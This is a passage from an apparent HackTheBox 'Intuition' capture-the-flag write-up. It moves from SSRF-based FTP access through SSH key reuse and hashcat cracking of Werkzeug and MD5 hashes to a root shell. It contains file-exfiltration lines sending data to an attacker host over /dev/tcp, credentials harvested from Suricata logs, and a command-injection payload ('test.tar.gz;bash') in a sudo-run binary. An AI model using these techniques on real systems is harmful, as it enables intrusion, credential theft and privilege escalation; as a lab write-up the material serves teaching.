                        ftp.storbinary(f'STOR {backup_filename}', file) 
                        ftp.quit() 
                        os.remove(backup_filename) 
                        flash('Backup and upload completed successfully!', 'success') 
                except Exception as e: 
                    flash(f'Error: {str(e)}', 'error') 
    
    return redirect(url_for('dashboard.dashboard'))
```

# Access as dev_acc

As I have this ssrf that supports a lot of schemes, I can connect to the ftp server and see what it has inside:

![](/assets/images/Intuition/Pasted%20image%2020240909130152.png)

![](/assets/images/Intuition/Pasted%20image%2020240909130206.png)

There are private-8297.key, welcome_note.pdf and welcome_note.txt files. Let's see welcome_note.txt:

![](/assets/images/Intuition/Pasted%20image%2020240909130309.png)

It says the passphrase for that private key:

![](/assets/images/Intuition/Pasted%20image%2020240909130651.png)

I will dump the private key in a file called privkey:

![](/assets/images/Intuition/Pasted%20image%2020240909130802.png)

![](/assets/images/Intuition/Pasted%20image%2020240909130820.png)

If I try changing the comment, I can see it has a comment "dev_acc@local", which seems like a user:

```bash
❯ ssh-keygen -c -f privkey
Enter passphrase: Y27SH19HDIWD
Old comment: dev_acc@local
```

Now, I can login to ssh with that user:

```bash
❯ ssh -i privkey dev_acc@10.10.11.15
Enter passphrase for key 'privkey': Y27SH19HDIWD
dev_acc@intuition:~$ 
```

And user.txt is available in home's directory:

```bash
dev_acc@intuition:~$ ls -l
total 4
-rw-r----- 1 root dev_acc 33 Sep  9 04:06 user.txt
dev_acc@intuition:~$ cat user.txt 
32****************************f1
```

# FTP access as adam

There is a users.db located in /var/www/app/blueprints/auth:

```bash
dev_acc@intuition:/var/www/app$ find . -type f | grep -vE '__pycache__|\.html$'
./app.py
./blueprints/auth/auth_utils.py
./blueprints/auth/users.sql
./blueprints/auth/users.db
./blueprints/auth/auth.py
./blueprints/report/report_utils.py
./blueprints/report/report.py
./blueprints/report/reports.db
./blueprints/report/reports.sql
./blueprints/dashboard/dashboard.py
./blueprints/index/index.py
```

And I can dump the users hashes:

```bash
dev_acc@intuition:/var/www/app$ sqlite3 blueprints/auth/users.db 
SQLite version 3.37.2 2022-01-06 13:25:41
Enter ".help" for usage hints.
sqlite> .tables
users
sqlite> pragma table_info(users);
0|id|INTEGER|0||1
1|username|TEXT|1||0
2|password|TEXT|1||0
3|role|TEXT|0|'user'|0
sqlite> select username,password from users;
admin|sha256$nypGJ02XBnkIQK71$f0e11dc8ad21242b550cc8a3c27baaf1022b6522afaadbfa92bd612513e9b606
adam|sha256$Z7bcBO9P43gvdQWp$a67ea5f8722e69ee99258f208dc56a1d5d631f287106003595087cf42189fc43
```

I can try to  bruteforce the hash by trying all the combinations of the dictionary rockyou.txt which has a lot of common insecure passwords and if the password used for the hash is in that dictionary, I can retrieve it.

I will start with the adam one and hashcat is auto-sufficient for detecting the hash type and it successfully cracks:

```bash
❯ hashcat adam.hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-sandybridge-AMD Ryzen 5 5600G with Radeon Graphics, 3417/6898 MB (1024 MB allocatable), 4MCU

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

30120 | Python Werkzeug SHA256 (HMAC-SHA256 (key = $salt)) | Framework

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

<..SNIP..>

sha256$Z7bcBO9P43gvdQWp$a67ea5f8722e69ee99258f208dc56a1d5d631f287106003595087cf42189fc43:adam gray
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 30120 (Python Werkzeug SHA256 (HMAC-SHA256 (key = $salt)))
Hash.Target......: sha256$Z7bcBO9P43gvdQWp$a67ea5f8722e69ee99258f208dc...89fc43
Time.Started.....: Mon Sep  9 13:33:47 2024 (13 secs)
Time.Estimated...: Mon Sep  9 13:34:00 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   628.7 kH/s (2.08ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10375168/14344385 (72.33%)
Rejected.........: 0/10375168 (0.00%)
Restore.Point....: 10373120/14344385 (72.31%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: adambayu -> adadeh289
Hardware.Mon.#1..: Util: 96%

Started: Mon Sep  9 13:33:28 2024
Stopped: Mon Sep  9 13:34:01 2024
```

The password for adam is "adam gray" and the admin's hash doesn't crack:

```bash
❯ hashcat admin.hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-sandybridge-AMD Ryzen 5 5600G with Radeon Graphics, 3417/6898 MB (1024 MB allocatable), 4MCU

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

30120 | Python Werkzeug SHA256 (HMAC-SHA256 (key = $salt)) | Framework

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

<..SNIP..>         

Session..........: hashcat                                
Status...........: Exhausted
Hash.Mode........: 30120 (Python Werkzeug SHA256 (HMAC-SHA256 (key = $salt)))
Hash.Target......: sha256$nypGJ02XBnkIQK71$f0e11dc8ad21242b550cc8a3c27...e9b606
Time.Started.....: Mon Sep  9 13:37:48 2024 (20 secs)
Time.Estimated...: Mon Sep  9 13:38:08 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   643.9 kH/s (2.31ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
Progress.........: 14344385/14344385 (100.00%)
Rejected.........: 0/14344385 (0.00%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: $HEX[206b72697374656e616e6e65] -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#1..: Util: 97%

Started: Mon Sep  9 13:37:47 2024
Stopped: Mon Sep  9 13:38:09 2024
```

The adam's password doesn't work in the system:

```bash
dev_acc@intuition:/var/www/app$ su adam
Password: adam gray
su: Authentication failure
```

But there's also a username adam in the ftp installation:

```bash
dev_acc@intuition:/var/www/app$ cd /opt/ftp/
dev_acc@intuition:/opt/ftp$ ls
adam  ftp_admin
```

So I will try it there and it works:

```bash
dev_acc@intuition:/opt/ftp$ ftp localhost
Connected to localhost.
220 pyftpdlib 1.5.7 ready.
Name (localhost:dev_acc): adam
331 Username ok, send password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

There are some backup files of something called runner1 but I have access denied:

```bash
ftp> dir
229 Entering extended passive mode (|||55389|).
150 File status okay. About to open data connection.
drwxr-xr-x   3 root     1002         4096 Apr 10 08:21 backup
226 Transfer complete.
ftp> cd backup
250 "/backup" is the current directory.
ftp> dir
229 Entering extended passive mode (|||50105|).
125 Data connection already open. Transfer starting.
drwxr-xr-x   2 root     1002         4096 Apr 10 08:21 runner1
226 Transfer complete.
ftp> cd runner
550 No such file or directory.
ftp> cd runner1
250 "/backup/runner1" is the current directory.
ftp> dir
229 Entering extended passive mode (|||36941|).
125 Data connection already open. Transfer starting.
-rwxr-xr-x   1 root     1002          318 Apr 06 00:25 run-tests.sh
-rwxr-xr-x   1 root     1002        16744 Oct 19  2023 runner1
-rw-r--r--   1 root     1002         3815 Oct 19  2023 runner1.c
226 Transfer complete.
ftp> prompt off
Interactive mode off.
ftp> mget .
local: run-tests.sh remote: run-tests.sh
229 Entering extended passive mode (|||40779|).
125 Data connection already open. Transfer starting.
100% |*******************************************************************************************************************************************|   318      152.97 KiB/s    00:00 ETA
226 Transfer complete.
318 bytes received in 00:00 (140.45 KiB/s)
local: runner1 remote: runner1
229 Entering extended passive mode (|||55749|).
125 Data connection already open. Transfer starting.
100% |*******************************************************************************************************************************************| 16744        2.19 MiB/s    00:00 ETA
226 Transfer complete.
16744 bytes received in 00:00 (2.12 MiB/s)
local: runner1.c remote: runner1.c
229 Entering extended passive mode (|||45135|).
150 File status okay. About to open data connection.
100% |*******************************************************************************************************************************************|  3815      871.88 KiB/s    00:00 ETA
226 Transfer complete.
3815 bytes received in 00:00 (831.41 KiB/s)
```

And I receive the files in current directory:

```bash
dev_acc@intuition:/tmp$ ls {runner1,runner1.c,run-tests.sh}
runner1  runner1.c  run-tests.sh
```

I will move it into a directory, zip it and transfer it to my machine:

```bash
dev_acc@intuition:/tmp$ mkdir adam-ftp
dev_acc@intuition:/tmp$ mv {runner1,runner1.c,run-tests.sh} adam-ftp/
dev_acc@intuition:/tmp$ zip adam-ftp-files -r adam-ftp/ 
  adding: adam-ftp/ (stored 0%)
  adding: adam-ftp/runner1.c (deflated 69%)
  adding: adam-ftp/runner1 (deflated 77%)
  adding: adam-ftp/run-tests.sh (deflated 47%)
dev_acc@intuition:/tmp$ cat adam-ftp-files.zip > /dev/tcp/10.10.15.95/443
```

I will unzip it and inspect the files inside:

```bash
❯ unzip adam-ftp-files.zip
❯ cd adam-ftp
```

The runner1 file is a binary:

```bash
❯ file runner1
runner1: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=f520676a77c2264a29f5aa68c1d1f14eef2299c5, for GNU/Linux 3.2.0, not stripped
```

And runner1.c is probably the C code for the runner1 binary:

```c
// Version : 1

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <openssl/md5.h>

#define INVENTORY_FILE "/opt/playbooks/inventory.ini"
#define PLAYBOOK_LOCATION "/opt/playbooks/"
#define ANSIBLE_PLAYBOOK_BIN "/usr/bin/ansible-playbook"
#define ANSIBLE_GALAXY_BIN "/usr/bin/ansible-galaxy"
#define AUTH_KEY_HASH "0feda17076d793c2ef2870d7427ad4ed"

int check_auth(const char* auth_key) {
    unsigned char digest[MD5_DIGEST_LENGTH];
    MD5((const unsigned char*)auth_key, strlen(auth_key), digest);

    char md5_str[33];
    for (int i = 0; i < 16; i++) {
        sprintf(&md5_str[i*2], "%02x", (unsigned int)digest[i]);
    }

    if (strcmp(md5_str, AUTH_KEY_HASH) == 0) {
        return 1;
    } else {
        return 0;
    }
}

void listPlaybooks() {
    DIR *dir = opendir(PLAYBOOK_LOCATION);
    if (dir == NULL) {
        perror("Failed to open the playbook directory");
        return;
    }

    struct dirent *entry;
    int playbookNumber = 1;

    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_REG && strstr(entry->d_name, ".yml") != NULL) {
            printf("%d: %s\n", playbookNumber, entry->d_name);
            playbookNumber++;
        }
    }

    closedir(dir);
}

void runPlaybook(const char *playbookName) {
    char run_command[1024];
    snprintf(run_command, sizeof(run_command), "%s -i %s %s%s", ANSIBLE_PLAYBOOK_BIN, INVENTORY_FILE, PLAYBOOK_LOCATION, playbookName);
    system(run_command);
}

void installRole(const char *roleURL) {
    char install_command[1024];
    snprintf(install_command, sizeof(install_command), "%s install %s", ANSIBLE_GALAXY_BIN, roleURL);
    system(install_command);
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s [list|run playbook_number|install role_url] -a <auth_key>\n", argv[0]);
        return 1;
    }

    int auth_required = 0;
    char auth_key[128];

    for (int i = 2; i < argc; i++) {
        if (strcmp(argv[i], "-a") == 0) {
            if (i + 1 < argc) {
                strncpy(auth_key, argv[i + 1], sizeof(auth_key));
                auth_required = 1;
                break;
            } else {
                printf("Error: -a option requires an auth key.\n");
                return 1;
            }
        }
    }

    if (!check_auth(auth_key)) {
        printf("Error: Authentication failed.\n");
        return 1;
    }

    if (strcmp(argv[1], "list") == 0) {
        listPlaybooks();
    } else if (strcmp(argv[1], "run") == 0) {
        int playbookNumber = atoi(argv[2]);
        if (playbookNumber > 0) {
            DIR *dir = opendir(PLAYBOOK_LOCATION);
            if (dir == NULL) {
                perror("Failed to open the playbook directory");
                return 1;
            }

            struct dirent *entry;
            int currentPlaybookNumber = 1;
            char *playbookName = NULL;

            while ((entry = readdir(dir)) != NULL) {
                if (entry->d_type == DT_REG && strstr(entry->d_name, ".yml") != NULL) {
                    if (currentPlaybookNumber == playbookNumber) {
                        playbookName = entry->d_name;
                        break;
                    }
                    currentPlaybookNumber++;
                }
            }

            closedir(dir);

            if (playbookName != NULL) {
                runPlaybook(playbookName);
            } else {
                printf("Invalid playbook number.\n");
            }
        } else {
            printf("Invalid playbook number.\n");
        }
    } else if (strcmp(argv[1], "install") == 0) {
        installRole(argv[2]);
    } else {
        printf("Usage2: %s [list|run playbook_number|install role_url] -a <auth_key>\n", argv[0]);
        return 1;
    }

    return 0;
}

```

The run-tests.sh gives examples on how to use it and leaks a part of the auth code:

```bash
❯ /bin/cat run-tests.sh
#!/bin/bash

# List playbooks
./runner1 list

# Run playbooks [Need authentication]
# ./runner run [playbook number] -a [auth code]
#./runner1 run 1 -a "UHI75GHI****"

# Install roles [Need authentication]
# ./runner install [role url] -a [auth code]
#./runner1 install http://role.host.tld/role.tar -a "UHI75GHI****"
```

However that is not useful by now because I didn't found any privileged runner1 binary.

# Access as lopez

There is a suricata folder in /var/log, which is not default:

```bash
dev_acc@intuition:/var/log$ ls
apache2   auth.log.1     dmesg       dmesg.3.gz  kern.log       lastlog  suricata     vmware-network.1.log  vmware-network.5.log  vmware-vmsvc-root.1.log  vmware-vmtoolsd-root.log
apt       auth.log.2.gz  dmesg.0     dmesg.4.gz  kern.log.1     laurel   syslog       vmware-network.2.log  vmware-network.6.log  vmware-vmsvc-root.2.log  wtmp
audit     btmp           dmesg.1.gz  installer   kern.log.2.gz  nginx    syslog.1     vmware-network.3.log  vmware-network.7.log  vmware-vmsvc-root.3.log
auth.log  btmp.1         dmesg.2.gz  journal     landscape      private  syslog.2.gz  vmware-network.4.log  vmware-network.log    vmware-vmsvc-root.log
```

Searching that folder in google, leds to a software called "Suricata":

![](/assets/images/Intuition/Pasted%20image%2020240909192802.png)

Suricata is a network analysis and threat detection software:

![](/assets/images/Intuition/Pasted%20image%2020240909192852.png)

It would be interesting to look at this because it can have passwords or credentials used in the network so I will zip it and transfer it to my machine:

```bash
❯ nc -lvnp 443 > suricata-logs.zip
```

```bash
dev_acc@intuition:/var/log$ zip /tmp/suricata-logs -r suricata/
dev_acc@intuition:/var/log$ cat /tmp/suricata-logs.zip > /dev/tcp/10.10.15.95/443
```

```bash
❯ unzip suricata-logs.zip
❯ cd suricata
❯ gzip -d *.gz
```

Filtering for word "pass" gives ftp commands that a `lopez` user used:

```bash
❯ cat * | grep --text -i pass | grep -vE 'flow.mgr.full_hash_pass|"event_type":"stats"|"http_user_agent":"Fuzz Faster U Fool v2.0.0-dev"'
```

> Note: here I removed lines that contained `"event_type": "stats"` because that's not network data and also removed the lines that contained `"http_user_agent":"Fuzz Faster U Fool v2.0.0-dev"` because that was fuzzing requests of me and another users of hackthebox. The removing of `flow.mgr.full_hash_pass` is because it disturbed and didn't gived interesting data.

![](/assets/images/Intuition/Pasted%20image%2020240910212341.png)
I can see two possible password for user lopez, "Lopezzz1992%123" and "Lopezz1992%123". They obviously doesn't work for ftp (because there is not directory in /opt/ftp with name lopez):

```bash
dev_acc@intuition:/var/log$ ftp lopez@localhost
Connected to localhost.
220 pyftpdlib 1.5.7 ready.
331 Username ok, send password.
Password: Lopezzz1992%123
530 Authentication failed.
ftp: Login failed
dev_acc@intuition:/var/log$ ftp lopez@localhost
Connected to localhost.
220 pyftpdlib 1.5.7 ready.
331 Username ok, send password.
Password: Lopezz1992%123
530 Authentication failed.
ftp: Login failed
```

But 'Lopezz1992%123' work for ssh:

```bash
❯ sshpass -p 'Lopezzz1992%123' ssh lopez@10.10.11.15
Permission denied, please try again.
❯ sshpass -p 'Lopezz1992%123' ssh lopez@10.10.11.15

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

lopez@intuition:~$ 
```

# Access as root

The lopez user has a sudoers privilege that lets him run `/opt/runner2/runner2` as any user he wants:

```bash
lopez@intuition:~$ sudo -l
[sudo] password for lopez: Lopezz1992%123
Matching Defaults entries for lopez on intuition:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User lopez may run the following commands on intuition:
    (ALL : ALL) /opt/runner2/runner2
```

This seems similar to runner1, running it shows the help panel and asks for a json file:

```bash
lopez@intuition:~$ sudo /opt/runner2/runner2 
Usage: /opt/runner2/runner2 <json_file>
```

But runner1 doesn't asks for it, so it's different:

```bash
❯ cd adam-ftp
❯ ls
run-tests.sh  runner1  runner1.c
❯ ./runner1
Usage: ./runner1 [list|run playbook_number|install role_url] -a <auth_key>
```

## Analysis of runner2

I will transfer runner2 to my machine to analyze it:

```bash
❯ nc -lvnp 443 > runner2
listening on [any] 443 ...
```

```bash
lopez@intuition:/tmp$ cat /opt/runner2/runner2 > /dev/tcp/10.10.15.95/443
```

Running it, asks for a json file:

```bash
❯ chmod +x runner2
❯ ./runner2
Usage: ./runner2 <json_file>
```

So it's different to runner1, which asks for a method and an auth key:

```bash
❯ ./adam-ftp/runner1
Usage: ./adam-ftp/runner1 [list|run playbook_number|install role_url] -a <auth_key>
```

Trying it with a random json file gives an error:

```bash
❯ /bin/cat test.json
{"key": "value"}
❯ ./runner2 test.json
Run key missing or invalid.
```

# Static analysis of runner2

I will open ghidra, create a new project (File > New project) and import the binary runner2 (File > Import File). Then drag the binary to the dragon symbol and I can see the main code in Functions > main. After analysing the code, renaming variables and putting comments, I can understand more or less how the binary works. 

First it parses some json data inside the json file and checks if the action key inside a run key exists so the syntax must be `{"run": {"action": "somethingToDo"}}` or otherwise it will give an error:

![](/assets/images/Intuition/Pasted%20image%2020240909232253.png)

If the action is equal to "list", it calls the function listPlaybooks:
![](/assets/images/Intuition/Pasted%20image%2020240909232308.png)

If I double click on this function, I can see that it just go for all the files in /opt/playbooks and if it's yml, it prints the file with the corresponding id:
![](/assets/images/Intuition/Pasted%20image%2020240910100656.png)

That's exactly what happens if I run it on the victim machine with a valid json that specifies that the action is list:

```bash
lopez@intuition:/tmp$ cat listPlaybooks.json 
{
	"run": {
		"action": "list"
	}
}
lopez@intuition:/tmp$ sudo /opt/runner2/runner2 listPlaybooks.json 
[sudo] password for lopez: Lopezz1992%123
1: apt_update.yml
```

The code that manages what happens if the action is run is this:
![](/assets/images/Intuition/Pasted%20image%2020240910101737.png)

It needs more keys, "num" inside the "run" key and "auth_code" in the main object (`{"run": {"action": "run", "num": something}, "auth_code": something}`):

![](/assets/images/Intuition/Pasted%20image%2020240910101943.png)

The `auth_code` key is needed to check if it's correct using the `check_auth` function:

![](/assets/images/Intuition/Pasted%20image%2020240910102044.png)
The `check_auth` function checks if the md5 hash of the string passed (in this case auth_code value in the json) is equal to "0feda17076d793c2ef2870d7427ad4ed"

![](/assets/images/Intuition/Pasted%20image%2020240910102456.png)

If the auth is successfull it enters in this piece of code, which just goes for each .yml file in `/opt/playbooks` directory and if the index of that file is equal to the value specified in `num` key, it will call the function runPlaybook passing the file as argument:

![](/assets/images/Intuition/Pasted%20image%2020240910102614.png)

The runPlaybook function executes the command `                       /usr/bin/ansible-playbook -i /opt/playbooks/inventory.ini /opt/playbooks/<playbookFile>` where playbookFile is the file that corresponds to the "num" key in the json file specified:

![](/assets/images/Intuition/Pasted%20image%2020240910110221.png)

If I manage to run a custom ansible playbook it would be very interesting because I can run commands like shown [here](https://docs.ansible.com/ansible/latest/collections/ansible/builtin/shell_module.html#examples). But it won't be the case.

By now, I only need the correct auth_code and I remembered that the file `run-tests.sh` from the ftp files that `adam` had access leaked a part of the auth code:

```bash
❯ cd adam-ftp
❯ ls
run-tests.sh  runner1  runner1.c
❯ /bin/cat run-tests.sh
#!/bin/bash

# List playbooks
./runner1 list

# Run playbooks [Need authentication]
# ./runner run [playbook number] -a [auth code]
#./runner1 run 1 -a "UHI75GHI****"

# Install roles [Need authentication]
# ./runner install [role url] -a [auth code]
#./runner1 install http://role.host.tld/role.tar -a "UHI75GHI****"
```

And the auth_code hasn't changed from `runner1` and `runner2`:

```bash
❯ cat runner1.c | grep AUTH_KEY_HASH
#define AUTH_KEY_HASH "0feda17076d793c2ef2870d7427ad4ed"
```

![](/assets/images/Intuition/Pasted%20image%2020240910103215.png)

So I will bruteforce it using hashcat with not a dictionary but a set of characters and it cracks so fast:

```bash
❯ /bin/cat auth_code.hash
0feda17076d793c2ef2870d7427ad4ed
❯ hashcat -a 3 -m 0 auth_code.hash 'UHI75GHI?a?a?a?a'
hashcat (v6.2.6) starting

<..SNIP..>

0feda17076d793c2ef2870d7427ad4ed:UHI75GHINKOP             
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 0feda17076d793c2ef2870d7427ad4ed
Time.Started.....: Tue Sep 10 10:35:30 2024 (3 secs)
Time.Estimated...: Tue Sep 10 10:35:33 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Mask.......: UHI75GHI?a?a?a?a [12]
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  3821.3 kH/s (0.19ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 11192320/81450625 (13.74%)
Rejected.........: 0/11192320 (0.00%)
Restore.Point....: 11190272/81450625 (13.74%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: UHI75GHI5ZE2 -> UHI75GHI%!0*
Hardware.Mon.#1..: Util: 70%

Started: Tue Sep 10 10:35:13 2024
Stopped: Tue Sep 10 10:35:35 2024
```

The `-a 3` specifies bruteforce mode and where there is a ?a means that there goes a character that can be a letter, digit or symbol like specified in the hashcat help panel:

```bash
❯ hashcat --help
```
![](/assets/images/Intuition/Pasted%20image%2020240910104423.png)
![](/assets/images/Intuition/Pasted%20image%2020240910104518.png)

Now that I have the auth_code, I will run runner2 in the victim machine specifying the num 1 as it's the only playbook available and it runs sucessfully:

```bash
lopez@intuition:/tmp$ vi runPlaybook1.json 
{
	"run": {
		"action": "run",
		"num": 1
	},
	"auth_code": "UHI75GHINKOP"
}
lopez@intuition:/tmp$ sudo /opt/runner2/runner2 runPlaybook1.json 
[sudo] password for lopez: 

PLAY [Update and Upgrade APT Packages test] ********************************************************************************************************************************************

TASK [Gathering Facts] *****************************************************************************************************************************************************************
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
ED25519 key fingerprint is SHA256:++SuiiJ+ZwG7d5q6fb9KqhQRx1gGhVOfGR24bbTuipg.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
ok: [127.0.0.1]

TASK [Update APT Cache] ****************************************************************************************************************************************************************
[WARNING]: Skipping plugin (/usr/lib/python3/dist-packages/ansible/plugins/filter/core.py) as it seems to be invalid: cannot import name 'environmentfilter' from 'jinja2.filters'
(/usr/local/lib/python3.11/dist-packages/jinja2/filters.py)
[WARNING]: Skipping plugin (/usr/lib/python3/dist-packages/ansible/plugins/filter/mathstuff.py) as it seems to be invalid: cannot import name 'environmentfilter' from 'jinja2.filters'
(/usr/local/lib/python3.11/dist-packages/jinja2/filters.py)
```

Nothing interesting by now because it only updates the apt cache and the packages:

```bash
lopez@intuition:/tmp$ cat /opt/playbooks/apt_update.yml 
---
- name: Update and Upgrade APT Packages test
  hosts: local
  become: yes
  tasks:
    - name: Update APT Cache
      apt:
        update_cache: yes
      when: ansible_distribution == 'Debian' or ansible_distribution == 'Ubuntu'

    - name: Upgrade APT Packages
      apt:
        upgrade: dist
        update_cache: yes
      when: ansible_distribution == 'Debian' or ansible_distribution == 'Ubuntu'
```

However, there is another functionality, which is install and it needs a key "role_file" which is passed as argument to the function installRole:

![](/assets/images/Intuition/Pasted%20image%2020240910105337.png)

The installRole function checks if the role file is a valid .tar archive and if that is the case, it executes the command `/usr/bin/ansible-galaxy install <role_file>` where role_file is the file specified in the "role_file" key in the json:
![](/assets/images/Intuition/Pasted%20image%2020240910105534.png)

This is interesting as there is no sanitization in the system command and I can append another command to execute with a `;`. However the file needs to be a valid tar archive.

To create a role file I need to create a new role with the base structure:
```bash
❯ mkdir ansible-galaxy
❯ cd ansible-galaxy
❯ ansible-galaxy role init test
- Role test was created successfully
```
Now I have the role folder created:
```bash
❯ /bin/ls test
README.md  defaults  files  handlers  meta  tasks  templates  tests  vars
```
I will tar compress it and transfer it to /tmp of the victim machine.
```bash
❯ tar -cvzf test.tar.gz test
<..SNIP..>
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...```

```bash
lopez@intuition:/tmp$ wget http://10.10.15.95/test.tar.gz
--2024-09-10 16:24:36--  http://10.10.15.95/test.tar.gz
Connecting to 10.10.15.95:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1787 (1.7K) [application/gzip]
Saving to: ‘test.tar.gz’

test.tar.gz                                   100%[=================================================================================================>]   1.75K  --.-KB/s    in 0s      

2024-09-10 16:24:36 (95.4 MB/s) - ‘test.tar.gz’ saved [1787/1787]
```

As saw before, there is no sanitization in the input passed to the system function. So I can rename the file to be ''test.tar.gz;bash" and put that filename in the role_file key in the JSON file to execute a bash shell when I run the program:

```bash
lopez@intuition:/tmp$ cp test.tar.gz test.tar.gz\;bash
lopez@intuition:/tmp$ vi installRole.json 
lopez@intuition:/tmp$ cat installRole.json 
{
	"run": 
	{
		"action": "install", 
		"role_file": "test.tar.gz;bash"
	}, 
	"auth_code": "UHI75GHINKOP"
}
```

Now I will run it and if it works, I should have a bash of root just because it's run as root:

```bash
lopez@intuition:/tmp$ sudo /opt/runner2/runner2 installRole.json 
Starting galaxy role install process
- test.tar.gz is already installed, skipping.
root@intuition:/tmp# 
```

It worked and I can see root.txt in /root:

```bash
root@intuition:/tmp# cd /root/
root@intuition:~# cat root.txt 
ca****************************c6
```

That's the machine guys. Hope you learned and liked!


{% endraw %}
